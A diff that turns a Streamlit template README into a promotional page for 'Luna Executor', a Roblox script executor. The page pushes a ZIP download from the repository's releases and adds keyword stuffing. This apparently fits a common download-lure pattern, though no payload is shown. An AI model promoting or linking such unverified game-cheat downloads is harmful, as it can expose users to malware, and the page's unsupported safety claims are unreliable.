@@ -1,19 +1,13 @@
-# 🎈 Blank app template
+# Luna Executor 🌌 - Download Roblox Executor For PC! **[![Download Luna Executor](https://img.shields.io/badge/Download-Luna%20Executor-blueviolet)](../../releases)**
 
-A simple Streamlit app template for you to modify!
+## Quick Installation
+Get started with Luna Executor in just a few simple steps:
+1. **[![Download Luna Executor](https://img.shields.io/badge/Download-Luna%20Executor-blueviolet)](../../releases)**
+2. Extract the downloaded ZIP file to a preferred location on your system.
 
-[![Open in Streamlit](https://static.streamlit.io/badges/streamlit_badge_black_white.svg)](https://blank-app-template.streamlit.app/)
+## About Luna Executor  
+🚀 **Luna Executor** is a high-performance Roblox script executor designed for smooth script execution, enhanced gameplay, and seamless usability. Built with security in mind, it remains fully compatible with the latest Roblox updates, offering a stable and efficient experience for gamers, developers, and modding enthusiasts.
 
-### How to run it on your own machine
+**Keywords:** Roblox executor, script execution tool, modding software, gaming utilities, script engine, performance optimization, advanced scripting 2024.
 
-1. Install the requirements
-
-   ```
-   $ pip install -r requirements.txt
-   ```
-
-2. Run the app
-
-   ```
-   $ streamlit run streamlit_app.py
-   ```
+![Luna Executor Preview](/assets/Luna.png)
